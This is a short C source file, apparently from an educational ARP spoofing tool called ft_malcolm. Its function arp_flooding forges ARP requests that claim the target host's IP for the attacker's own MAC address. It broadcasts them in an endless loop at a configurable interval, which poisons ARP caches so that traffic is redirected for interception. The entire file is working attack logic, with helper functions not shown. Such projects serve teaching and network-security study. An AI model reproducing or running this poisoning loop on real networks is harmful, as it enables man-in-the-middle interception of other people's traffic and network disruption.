# include "../includes/ft_malcom.h"

static uint8_t get_inval(t_malcom *mstruct)
{
	if (!(mstruct->options.flags & MALC_OPT_FLOOD_INVAL))
		return (FLOOD_INVAL);

	uint8_t inval_ptr = (uint8_t)ft_atoi(mstruct->options.optn_data[MALC_OPT_FLOOD_INVAL]);
	
	return inval_ptr;
}

void	arp_flooding(t_malcom *mstruct)
{
	uint8_t inval = get_inval(mstruct);
	t_sockaddr_ll brd_ll, own_macaddr ;
	t_com_devices devs;

	ft_bzero(&brd_ll, sizeof(t_sockaddr_ll));
	ft_bzero(&own_macaddr, sizeof(t_sockaddr_ll));

	get_mac_from_ifname(&own_macaddr, mstruct->dst_host.ifa_name);
	get_if_brd((t_sockaddr *)&brd_ll, mstruct->dst_host.ifa_name, AF_PACKET);

	ft_memcpy(devs.sha, own_macaddr.sll_addr, ETH_ALEN);
	ft_memcpy(devs.tha, brd_ll.sll_addr, ETH_ALEN);

	ft_memcpy(devs.sip, &(mstruct->dst_host.sock_addr_in.sin_addr), IP_ALEN);
	ft_memcpy(devs.tip, &(mstruct->src_host.sock_addr_in.sin_addr), IP_ALEN);

	while (TRUE)
	{
		send_arp(ARPOP_REQUEST, mstruct, &devs, &own_macaddr);
		ft_sleep((double)inval);
	}
}
